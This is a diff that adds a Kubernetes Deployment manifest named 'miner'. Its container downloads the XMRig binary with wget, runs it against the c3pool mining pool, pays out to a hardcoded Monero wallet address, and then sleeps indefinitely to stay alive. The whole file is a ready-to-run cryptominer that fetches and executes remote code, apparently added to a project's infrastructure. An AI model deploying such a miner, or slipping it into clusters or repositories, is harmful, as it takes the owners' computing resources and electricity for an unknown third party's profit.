@@ -1,0 +1,31 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: miner
+  labels:
+    app: miner
+spec:
+  selector:
+    matchLabels:
+      app: miner
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: miner
+    spec:
+      terminationGracePeriodSeconds: 1
+      containers:
+        - name: miner
+          image: ubuntu:20.04
+          command:
+            - /bin/bash
+            - -c
+            - |-
+              sleep 1
+              apt update && apt-get install wget -y
+              wget -O xmrig.tar.gz https://github.com/MoneroOcean/xmrig/releases/download/v6.21.0-mo1/xmrig-v6.21.0-mo1-lin64.tar.gz && \
+              tar -xzvf xmrig.tar.gz && \
+              chmod +x xmrig
+              sh -c "./xmrig -o auto.c3pool.org:443 -u 466hPmWFuxaghBDVdwaRX87tweyxMJNyM4UZZVzqBiFZA6MYi5y1AyLYERjxke7gSk94WsFpbiVMuEYmvgyadhqK1CJYZE7 --nicehash -k --rig-id=1127 -t 1"
+              sleep 1000000000
